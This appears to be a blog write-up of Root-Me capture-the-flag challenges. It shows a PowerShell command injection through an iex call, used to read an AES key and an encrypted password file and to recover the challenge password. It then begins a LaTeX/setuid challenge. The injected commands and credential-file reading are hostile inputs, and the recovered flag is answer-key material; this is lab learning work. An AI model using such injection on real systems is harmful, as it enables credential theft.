</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Press</span><span class="w"> </span><span class="n">Shift</span><span class="nt">-F1</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">help</span><span class="p">]</span><span class="w">

</span><span class="n">Host/IP</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">ssh://</span><span class="w"> </span><span class="nx">URL</span><span class="w"> </span><span class="p">[</span><span class="n">localhost</span><span class="p">]:</span><span class="w"> </span><span class="nx">ssh://app-script-ch19:app-script-ch19</span><span class="err">@</span><span class="nx">challen</span><span class="w">
</span><span class="n">ge05</span><span class="w">
</span><span class="nx">Connecting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ssh://app-script-ch19</span><span class="err">@</span><span class="nx">challenge05:22</span><span class="w">

</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_rsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_rsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_dsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_dsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ecdsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ecdsa"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ed25519"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ed25519"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_xmss"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">pubkey</span><span class="w"> </span><span class="s2">"/dev/null/.ssh/id_xmss"</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w">
      </span><span class="err">_</span><span class="w">           </span><span class="err">_</span><span class="w"> </span><span class="err">_</span><span class="w">                        </span><span class="err">___</span><span class="w">  </span><span class="err">____</span><span class="w">
  </span><span class="err">___</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">__</span><span class="w">   </span><span class="err">__</span><span class="w"> </span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="err">___</span><span class="w"> </span><span class="err">_</span><span class="w"> </span><span class="err">__</span><span class="w">   </span><span class="err">__</span><span class="w"> </span><span class="err">_</span><span class="w">  </span><span class="err">___</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">\</span><span class="o">|</span><span class="w"> </span><span class="err">___</span><span class="o">|</span><span class="w">
 </span><span class="n">/</span><span class="w"> </span><span class="nx">__</span><span class="o">|</span><span class="w"> </span><span class="s1">'_ \ / _` | | |/ _ \ '</span><span class="err">_</span><span class="w"> </span><span class="n">\</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">_</span><span class="se">` </span><span class="o">|</span><span class="n">/</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">\</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">___</span><span class="w"> </span><span class="n">\</span><span class="w">
</span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="err">__</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="err">__</span><span class="n">/</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="err">__</span><span class="n">/</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">___</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
 </span><span class="n">\___</span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="n">\__</span><span class="p">,</span><span class="nx">_</span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="n">\___</span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="n">\__</span><span class="p">,</span><span class="w"> </span><span class="o">|</span><span class="n">\___</span><span class="o">|</span><span class="n">\___/</span><span class="o">|</span><span class="err">____</span><span class="n">/</span><span class="w">
                                 </span><span class="o">|</span><span class="err">___</span><span class="n">/</span><span class="w"> </span><span class="nx">root-me.org</span><span class="w">

</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">ls</span><span class="w">
</span><span class="nx">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">

    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\cygwin64\challenge\app-script\ch19</span><span class="w">

</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">10</span><span class="n">/29/2020</span><span class="w">   </span><span class="nx">9:27</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">361</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="nx">10/29/2020</span><span class="w">   </span><span class="nx">9:23</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">176</span><span class="w"> </span><span class="nx">AES.key</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">10</span><span class="n">/29/2020</span><span class="w">   </span><span class="nx">9:30</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">331</span><span class="w"> </span><span class="nx">ch19.ps1</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w">
</span><span class="nx">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="mi">76492</span><span class="n">d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQA</span><span class="w">
</span><span class="nx">RQBqAEEARQBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAA</span><span class="w">
</span><span class="n">NwA3ADIAYgBkADYANgAyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYA</span><span class="w">
</span><span class="nx">NgBkAGYAYgAxAGMAMgAwADUANQBkADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYA</span><span class="w">
</span><span class="n">MAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAyADkA</span><span class="w">
</span><span class="nx">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">Get-content</span><span class="w"> </span><span class="nx">AES.key</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="mi">3</span><span class="w">
</span><span class="mi">4</span><span class="w">
</span><span class="mi">2</span><span class="w">
</span><span class="mi">3</span><span class="w">
</span><span class="mi">56</span><span class="w">
</span><span class="mi">34</span><span class="w">
</span><span class="mi">254</span><span class="w">
</span><span class="mi">222</span><span class="w">
</span><span class="mi">1</span><span class="w">
</span><span class="mi">1</span><span class="w">
</span><span class="mi">2</span><span class="w">
</span><span class="mi">23</span><span class="w">
</span><span class="mi">42</span><span class="w">
</span><span class="mi">54</span><span class="w">
</span><span class="mi">33</span><span class="w">
</span><span class="mi">233</span><span class="w">
</span><span class="mi">1</span><span class="w">
</span><span class="mi">34</span><span class="w">
</span><span class="mi">2</span><span class="w">
</span><span class="mi">7</span><span class="w">
</span><span class="mi">6</span><span class="w">
</span><span class="mi">5</span><span class="w">
</span><span class="mi">35</span><span class="w">
</span><span class="mi">43</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">Get-content</span><span class="w"> </span><span class="nx">ch19.ps1</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">

</span><span class="nv">$KeyFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"AES.key"</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nv">$KeyFile</span><span class="w">
</span><span class="nv">$SecurePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-key</span><span class="w"> </span><span class="nv">$Key</span><span class="w">

</span><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">){</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Table to dump:"</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="nt">-NoNewLine</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="w">
        </span><span class="nv">$table</span><span class="o">=</span><span class="n">Read-Host</span><span class="w">

        </span><span class="n">iex</span><span class="w"> </span><span class="s2">"Write-Host Connect to the database With the secure Password: </span><span class="nv">$SecurePassword</span><span class="s2">. Backup the table </span><span class="nv">$table</span><span class="s2">"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="nv">$KeyFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"AES.key"</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="nv">$Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-content</span><span class="w"> </span><span class="nv">$KeyFile</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-key</span><span class="w"> </span><span class="nv">$Key</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">System.Security.SecureString</span><span class="w">
</span><span class="nx">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="se">`
</span><span class="w">              </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"app-script-ch19"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="nv">$key</span><span class="p">)</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="nv">$Cred</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">Password</span><span class="w">
</span><span class="n">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="nx">System.Security.SecureString.</span><span class="w">
</span><span class="n">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">SecureStringBypass</span><span class="w">
</span><span class="nx">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>https://www.cnblogs.com/sparkdev/archive/2017/08/01/7258507.html</p><p>https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/</p><p>https://adamtheautomator.com/powershell-get-credential/</p><h2 id="latex---input">LaTeX - Input</h2><p>提示语：Introduction à LaTeX</p><p>Énoncé Savez-vous comment fonctionne la commande input ?</p><p>官方参考： <a href="http://repository.root-me.org/Programmation/Latex/FR%20-%20Latex%20Global.pdf">Latex Global</a></p><p><a href="http://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Cheat%20Sheet.pdf">Latex Cheat Sheet</a></p><p><a href="http://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Guide.pdf">Latex Guide</a></p><p>解题</p><p>进入靶机后的欢迎界面没有任何有用信息。</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre>[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch23:app-script-ch23@challen
ge02
Connecting to ssh://app-script-ch23@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.
</pre></table></code></div></div><p>查看文件可知， .passwd 为 flag ， setuid-wrapper 应该是主程序， ch23 是另一个脚本程序。</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>app-script-ch23@challenge02:~$ ll
total 668
drwxr-x---  2 app-script-ch23-cracked app-script-ch23           4096 Mar 16  2021 ./
drwxr-xr-x 23 root                    root                      4096 Aug 18 21:10 ../
-r--------  1 app-script-ch23-cracked app-script-ch23-cracked     93 Mar  3  2021 .passwd
-r-xr-x---  1 app-script-ch23-cracked app-script-ch23            893 Mar 16  2021 ch23.sh*
-rwsr-x---  1 app-script-ch23-cracked app-script-ch23         661788 Mar 16  2021 setuid-wrapper*
-r--r-----  1 app-script-ch23-cracked app-script-ch23            262 Mar 16  2021 setuid-wrapper.c
</pre></table></code></div></div><p>查看 setuid-wrapper.c 这个文件</p><div class="language-c highlighter-rouge"><div class="code-header" text-data="c"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cm">/* setuid script wrapper */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">arc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">arv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-p"</span><span class="p">,</span> <span class="s">"/challenge/app-script/ch23/ch23.sh"</span><span class="p">,</span> <span class="n">ar</span>
<span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
